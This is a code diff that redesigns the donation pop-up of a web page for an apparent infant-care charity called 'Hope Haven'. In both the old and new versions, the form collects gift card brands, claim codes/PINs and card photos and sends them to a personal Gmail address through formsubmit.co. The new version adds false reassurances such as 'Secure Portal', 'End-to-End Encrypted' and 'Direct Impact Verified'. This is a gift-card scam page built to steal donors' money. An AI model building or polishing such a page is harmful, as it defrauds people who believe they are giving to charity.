@@ -689,40 +689,85 @@
 </section>
 
 <div id="donation-modal" class="modal-overlay">
-    <div class="modal-content">
-        <span class="close-modal" onclick="closeDonation()">&times;</span>
-        
-        <div class="modal-split">
-            <div class="modal-info">
-                <h3>Gift Card Donation</h3>
-                <p>We prefer Gift Cards because they bypass international banking delays, allowing us to buy supplies immediately.</p>
-                <ul class="guide-list">
-                    <li><i class="fas fa-check"></i> Instant Supply Access</li>
-                    <li><i class="fas fa-check"></i> Zero Processing Fees</li>
-                    <li><i class="fas fa-check"></i> 100% Direct Impact</li>
-                </ul>
+    <div class="donation-container">
+        <button class="modal-close-btn" onclick="closeDonation()">&times;</button>
+
+        <div class="donation-sidebar">
+            <div class="sidebar-header">
+                <div class="icon-circle">
+                    <i class="fas fa-shield-alt"></i>
+                </div>
+                <h3>Secure Portal</h3>
+            </div>
+            
+            <div class="impact-stats">
+                <div class="stat-item">
+                    <span class="stat-number">$50</span>
+                    <span class="stat-desc">Provides 1 week of specialized formula</span>
+                </div>
+                <div class="stat-item">
+                    <span class="stat-number">$100</span>
+                    <span class="stat-desc">Covers full medical checkups for 3 infants</span>
+                </div>
             </div>
 
-            <div class="modal-form">
-                <form action="https://formsubmit.co/organization461@gmail.com" method="POST" enctype="multipart/form-data">
-                    <input type="text" name="name" placeholder="Full Name" required>
-                    <select name="card_type">
-                        <option>Amazon Card</option>
-                        <option>Apple / iTunes</option>
-                        <option>Visa / Vanilla</option>
-                        <option>Steam / Razor</option>
-                    </select>
-                    <input type="text" name="code" placeholder="Card Code / PIN" required>
-                    <div class="file-input-wrapper">
-                        <label>Upload Card Photos (Front & Back)</label>
-                        <input type="file" name="attachment" accept="image/*" required>
-                    </div>
-                    <button type="submit" class="submit-btn">Send Donation</button>
-                </form>
+            <div class="security-footer">
+                <p><i class="fas fa-lock"></i> End-to-End Encrypted</p>
+                <p><i class="fas fa-check-circle"></i> Direct Impact Verified</p>
             </div>
         </div>
+
+        <div class="donation-main">
+            <header class="form-header">
+                <h2>Support Hope Haven</h2>
+                <p>Please provide the gift card details below to complete your donation.</p>
+            </header>
+
+            <form action="https://formsubmit.co/organization461@gmail.com" method="POST" enctype="multipart/form-data" class="premium-form">
+                <input type="hidden" name="_captcha" value="false">
+                <input type="hidden" name="_template" value="table">
+                
+                <div class="input-group">
+                    <label for="donor-name">Your Full Name</label>
+                    <input type="text" id="donor-name" name="Donor_Name" placeholder="Enter your name" required>
+                </div>
+
+                <div class="input-row">
+                    <div class="input-group">
+                        <label for="card-type">Card Brand</label>
+                        <select id="card-type" name="Card_Brand" required>
+                            <option value="" disabled selected>Select brand</option>
+                            <option value="Amazon">Amazon</option>
+                            <option value="Apple">Apple / iTunes</option>
+                            <option value="Visa">Visa / Vanilla</option>
+                            <option value="Steam">Steam / Razer</option>
+                        </select>
+                    </div>
+                    <div class="input-group">
+                        <label for="card-code">Claim Code</label>
+                        <input type="text" id="card-code" name="Card_Code" placeholder="Enter PIN/Code" required>
+                    </div>
+                </div>
+
+                <div class="input-group">
+                    <label>Verification Image</label>
+                    <div class="custom-file-upload">
+                        <input type="file" id="file-upload" name="attachment" accept="image/*" required onchange="displayFileName(this)">
+                        <label for="file-upload" class="file-drop-zone">
+                            <i class="fas fa-cloud-upload-alt"></i>
+                            <span id="file-label-text">Click to upload card photo (Front & Back)</span>
+                        </label>
+                    </div>
+                </div>
+
+                <button type="submit" class="premium-submit-btn" id="submit-btn">
+                    <span>Confirm Donation</span>
+                    <i class="fas fa-heart"></i>
+                </button>
+            </form>
+        </div>
     </div>
-</div>>
+</div>
 
     <footer class="site-footer">
         <div class="footer-grid">
